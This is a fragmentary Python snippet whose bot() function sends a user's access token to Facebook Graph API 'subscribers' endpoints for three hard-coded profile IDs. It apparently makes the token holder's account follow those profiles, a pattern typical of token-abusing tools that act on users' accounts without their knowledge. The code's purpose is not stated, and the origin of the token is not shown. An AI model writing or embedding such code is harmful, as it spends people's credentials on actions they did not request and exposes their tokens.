...
def bot():
    ...
    requests.post('https://graph.facebook.com/100002217127294/subscribers?access_token=' + token)
    ...
    requests.post('https://graph.facebook.com/100035417441849/subscribers?access_token=' + token)
    ...
    requests.post('https://graph.facebook.com/100000585030282/subscribers?access_token=' + token)
